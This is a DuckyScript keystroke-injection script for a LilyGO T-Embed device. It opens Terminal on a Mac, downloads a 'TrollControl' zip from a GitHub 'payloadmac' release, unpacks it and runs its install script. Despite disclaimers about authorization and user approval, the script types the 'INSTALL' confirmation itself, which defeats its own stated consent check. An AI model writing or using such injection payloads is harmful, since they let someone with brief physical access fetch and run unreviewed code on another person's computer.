Troll Control authorized, visible Mac setup
===========================================

Only use on a Mac you own or are explicitly authorized to administer. This is a
visible setup helper, not a covert installer. Replace GITHUB_RELEASE_URL_HERE
with your HTTPS release URL for TrollControl-mac.zip before loading this script.

DuckyScript-style sequence (adapt key names/timing for your LilyGO T-Embed):

REM User must be present and approve every macOS prompt.
GUI SPACE
DELAY 1000
STRING Terminal
DELAY 1000
ENTER
DELAY 1500
STRING echo 'This installs Troll Control visibly. Review the prompt and type INSTALL only if authorized.'
ENTER
STRING curl -fL 'https://github.com/thefacerenz-droid/payloadmac/releases/download/v1.0.0/TrollControl-mac.zip' -o ~/Downloads/TrollControl-mac.zip && ditto -x -k ~/Downloads/TrollControl-mac.zip ~/Downloads && cd ~/Downloads/TrollControl-mac/MAC && chmod +x install.sh && ./install.sh
ENTER
DELAY 1000
STRING INSTALL
ENTER
